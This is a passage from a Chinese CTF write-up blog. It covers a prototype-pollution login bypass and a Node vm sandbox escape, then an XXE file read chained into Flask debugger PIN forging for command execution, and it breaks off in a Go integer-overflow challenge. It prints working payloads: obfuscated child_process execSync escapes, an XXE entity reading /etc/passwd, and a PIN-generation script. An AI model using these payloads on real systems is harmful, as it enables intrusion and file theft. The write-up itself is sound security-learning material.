    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">===</span> <span class="token string">'__proto__'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">continue</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> target
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其实看到这就会想到是原型链污染，<code>__proto__</code>被过滤了，但是可以使用<code>constructor.prototype</code>来绕过过滤<br>先注册一个<code>test</code>用户, 在登录时 POST 如下内容, 污染<code>admins</code>对象, 使得<code>username in admins</code>表达式的结果为 <code>True</code></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
    <span class="token string-property property">"username"</span><span class="token operator">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span>
    <span class="token string-property property">"password"</span><span class="token operator">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span>
    <span class="token string-property property">"constructor"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string-property property">"prototype"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token string-property property">"test"</span><span class="token operator">:</span> <span class="token string">"123"</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/ba5c72a83e3441ba81966da664e63f15.png" alt="456"></p>
<p><img src="https://img-blog.csdnimg.cn/319fb067e4264030bd677e8afbdb914e.png" alt="1"></p>
<p>然后就是vm沙箱逃逸<br>参考链接<a href="https://xz.aliyun.com/t/11859#toc-4">沙箱逃逸初识</a></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//方法一：</span>
<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
        <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">const</span> cc <span class="token operator">=</span> arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>caller<span class="token punctuation">;</span>
            <span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token punctuation">(</span>cc<span class="token punctuation">[</span><span class="token string">'constru'</span><span class="token operator">+</span><span class="token string">'ctor'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'constru'</span><span class="token operator">+</span><span class="token string">'ctor'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'return pro'</span><span class="token operator">+</span><span class="token string">'cess'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> p<span class="token punctuation">[</span><span class="token string">'mainM'</span><span class="token operator">+</span><span class="token string">'odule'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'requ'</span><span class="token operator">+</span><span class="token string">'ire'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'child_pr'</span><span class="token operator">+</span><span class="token string">'ocess'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'ex'</span><span class="token operator">+</span><span class="token string">'ecSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

<span class="token comment">//方法二：</span>
<span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> 
obj<span class="token punctuation">.</span><span class="token function">__defineGetter__</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> c <span class="token operator">=</span> arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>caller
    <span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token string">'constru'</span><span class="token operator">+</span><span class="token string">'ctor'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'constru'</span><span class="token operator">+</span><span class="token string">'ctor'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'return pro'</span><span class="token operator">+</span><span class="token string">'cess'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> p<span class="token punctuation">[</span><span class="token string">'mainM'</span><span class="token operator">+</span><span class="token string">'odule'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'requi'</span><span class="token operator">+</span><span class="token string">'re'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'child_pr'</span><span class="token operator">+</span><span class="token string">'ocess'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'ex'</span><span class="token operator">+</span><span class="token string">'ecSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">throw</span> obj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Week-3-rss-parser"><a href="#Week-3-rss-parser" class="headerlink" title="[Week 3]rss_parser"></a>[Week 3]rss_parser</h2><p>考点：XXE漏洞、计算pin码。<br><img src="https://img-blog.csdnimg.cn/f82184db0289425da13a12befbca8763.png" alt="1"><br>这里让我们输入url，看到xml文件可以想到可能会出现XXE漏洞，看一下源码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote
<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree
<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> re

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        feed_url <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r'^(http|https)://'</span><span class="token punctuation">,</span> feed_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>

        content <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>feed_url<span class="token punctuation">)</span><span class="token punctuation">.</span>content
        tree <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>BytesIO<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

        rss_title <span class="token operator">=</span> tree<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/channel/title'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
        rss_link <span class="token operator">=</span> tree<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/channel/link'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
        rss_posts <span class="token operator">=</span> tree<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'/channel/item'</span><span class="token punctuation">)</span>

        result<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span> <span class="token operator">=</span> rss_title
        result<span class="token punctuation">[</span><span class="token string">'link'</span><span class="token punctuation">]</span> <span class="token operator">=</span> rss_link
        result<span class="token punctuation">[</span><span class="token string">'posts'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>rss_posts<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span>
            rss_posts <span class="token operator">=</span> rss_posts<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span>

        <span class="token keyword">for</span> post <span class="token keyword">in</span> rss_posts<span class="token punctuation">:</span>
            post_title <span class="token operator">=</span> post<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'./title'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
            post_link <span class="token operator">=</span> post<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'./link'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
            result<span class="token punctuation">[</span><span class="token string">'posts'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'title'</span><span class="token punctuation">:</span> post_title<span class="token punctuation">,</span> <span class="token string">'link'</span><span class="token punctuation">:</span> unquote<span class="token punctuation">(</span>post_link<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
 
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> feed_url<span class="token operator">=</span>feed_url<span class="token punctuation">,</span> result<span class="token operator">=</span>result<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其他地方没有找到可疑的。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">tree <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>BytesIO<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/0a88ca131ec844ffb15b55cb126ffc1d.png" alt="465"><br><code>etree.parse</code>解析xml数据，可能会出现漏洞。<br>在自己服务器上创建一个xml文件<code>index.xml</code></p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">
&lt;!ENTITY file SYSTEM "file:///etc/passwd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rss</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>atom</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2005/Atom<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>channel</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span><span class="token punctuation">></span></span>https://exp10it.cn/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>link</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>item</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span><span class="token punctuation">></span></span>https://exp10it.cn/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>link</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>item</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>channel</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rss</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后开启一个http服务<br>靶机访问该文件，发现成功读取到<code>/etc/passwd</code>文件。<br><img src="https://img-blog.csdnimg.cn/a4bc997150e64f3ba3b3ab94b5067603.png" alt="1"><br>由于可以进行任意文件读取，而且还是python搭建的网站，直接读取文件计算pin码。</p>
<h3 id="计算pin码"><a href="#计算pin码" class="headerlink" title="计算pin码"></a>计算pin码</h3><p>计算pin码所需条件</p>
<ul>
<li>username 在可以任意文件读的条件下读 &#x2F;etc&#x2F;passwd进行猜测</li>
<li>modname 默认flask.app</li>
<li>appname 默认Flask</li>
<li>moddir flask库下app.py的绝对路径,可以通过报错拿到,如传参的时候给个不存在的变量</li>
<li>uuidnode mac地址的十进制,任意文件读 &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</li>
<li>machine_id 机器码  #linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id，docker靶机则读取&#x2F;proc&#x2F;self&#x2F;cgroup</li>
</ul>
<p>读取完对应值后填入相应脚本计算pin码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain

probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'app'</span>  <span class="token comment"># /etc/passwd</span>
    <span class="token string">'flask.app'</span><span class="token punctuation">,</span>  <span class="token comment"># 默认值</span>
    <span class="token string">'Flask'</span><span class="token punctuation">,</span>  <span class="token comment"># 默认值</span>
    <span class="token string">'/usr/local/lib/python3.9/site-packages/flask/app.py'</span>  <span class="token comment"># 报错得到</span>
<span class="token punctuation">]</span>

private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'2485378088962'</span><span class="token punctuation">,</span>  <span class="token comment"># /sys/class/net/eth0/address 十进制</span>
    <span class="token string">'fd3e34a4-6949-4575-83ed-79944fc5e148'</span>
    <span class="token comment"># 字符串合并：1./etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id，有boot-id那就拼接boot-id 2. /proc/self/cgroup</span>
<span class="token punctuation">]</span>

<span class="token comment"># 下面为源码里面抄的，不需要修改</span>
h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>

cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>

<span class="token comment"># If we need to generate a pin we salt it a bit more so that we don't</span>
<span class="token comment"># end up with the same value and generate out 9 digits</span>
num <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>
    num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

<span class="token comment"># Format the pincode in groups of digits for easier remembering if</span>
<span class="token comment"># we don't have a result yet.</span>
rv <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>
                num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
                <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>
            <span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        rv <span class="token operator">=</span> num

<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>得到pin码，填入后开始命令执行。<br><img src="https://img-blog.csdnimg.cn/925473e1a4c4477982a13855a341e2b0.png" alt="465"></p>
<h2 id="week3-GoShop"><a href="#week3-GoShop" class="headerlink" title="[week3] GoShop"></a>[week3] GoShop</h2><p>考点：整数溢出<br>既然是复现，那就不要为了做题而做题，着重学习这道题的考点。</p>
<p>这道题就是让我们来买flag，价格为999999999，涉及到数字大的，那考点在这里的概率就很大。<br><img src="https://img-blog.csdnimg.cn/21fa88c2de464768b427ee4010695e0c.png" alt="1"></p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"crypto/rand"</span>
	<span class="token string">"embed"</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"github.com/gin-contrib/sessions"</span>
	<span class="token string">"github.com/gin-contrib/sessions/cookie"</span>
	<span class="token string">"github.com/gin-gonic/gin"</span>
	<span class="token string">"github.com/google/uuid"</span>
	<span class="token string">"html/template"</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"os"</span>
	<span class="token string">"strconv"</span>
<span class="token punctuation">)</span>

<span class="token keyword">type</span> User <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
	Id    <span class="token builtin">string</span>
	Money <span class="token builtin">int64</span>
	Items <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int64</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">type</span> Product <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
	Name  <span class="token builtin">string</span>
	Price <span class="token builtin">int64</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> users <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>User

<span class="token keyword">var</span> products <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>Product

<span class="token comment">//go:embed public</span>
<span class="token keyword">var</span> fs embed<span class="token punctuation">.</span>FS

<span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	users <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>User<span class="token punctuation">)</span>
	products <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>Product<span class="token punctuation">&#123;</span>
		<span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"Apple"</span><span class="token punctuation">,</span> Price<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"Banana"</span><span class="token punctuation">,</span> Price<span class="token punctuation">:</span> <span class="token number">50</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"Orange"</span><span class="token punctuation">,</span> Price<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"Flag"</span><span class="token punctuation">,</span> Price<span class="token punctuation">:</span> <span class="token number">999999999</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">IndexHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"index.html"</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">InfoHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>

	<span class="token keyword">if</span> s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		u <span class="token operator">:=</span> uuid<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		users<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Id<span class="token punctuation">:</span> u<span class="token punctuation">,</span> Money<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span> Items<span class="token punctuation">:</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int64</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
		s<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> u<span class="token punctuation">)</span>
		s<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>

	user <span class="token operator">:=</span> users<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
	c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
		<span class="token string">"user"</span><span class="token punctuation">:</span> user<span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">ResetHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
